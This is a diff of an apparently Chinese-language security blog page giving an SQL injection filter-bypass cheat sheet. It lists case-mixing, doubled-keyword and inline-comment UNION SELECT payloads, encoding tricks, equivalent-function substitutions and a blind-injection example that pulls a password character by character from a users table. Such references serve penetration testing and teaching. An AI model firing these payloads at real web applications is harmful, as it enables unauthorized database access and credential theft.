@@ -56,20 +56,20 @@
 <p><code>/**/</code>，<code>//</code>, <code>#</code>, <code>--+</code>, <code>--</code>, <code>%00</code></p>
 </li>
 <li><p>使用大小写，如 </p>
-<p>?id&#x3D;1’ UniOn sELect daTabAsE(),2,daTabAsE(),4,daTabAsE()–+&#96;</p>
+<p><code>?id=1&#39; UniOn sELect daTabAsE(),2,daTabAsE(),4,daTabAsE()--+</code></p>
 </li>
 <li><p>双写绕过</p>
-<p>?id&#x3D;1’ UNUNIONION SELSELECTECT 1,name ,1,1 FROM sqlite_master WHERE type&#x3D;’table’–</p>
+<p><code>?id=1&#39; UNUNIONION SELSELECTECT 1,name ,1,1 FROM sqlite_master WHERE type=&#39;table&#39;--</code></p>
 </li>
 <li><p>内联注释绕过</p>
-<p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE <em>&#x2F;&#x2F;</em>!TaBlE_ScHeMa</em>&#x2F; like database()#</p>
+<p><code>id=-1&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</code></p>
 </li>
 <li><p>编码绕过</p>
 <p>如ASCII,HEX，URLencode绕过：</p>
 <p>注：urlencode需要用burpsuite发或者编码两次</p>
 </li>
 <li><p>拼接函数绕过</p>
-<p><code>select concat(&#39;123&#39;,&#39;456&#39;);</code></p>
+<p>select concat(‘123’,’456’);</p>
 </li>
 </ol>
 <h5 id="等价函数或变量（来源于速查表）："><a href="#等价函数或变量（来源于速查表）：" class="headerlink" title="等价函数或变量（来源于速查表）："></a>等价函数或变量（来源于<a target="_blank" rel="noopener" href="https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md">速查表</a>）：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#x27;password&#x27;),1,1) = 0x70</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&#x27;password&#x27;,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
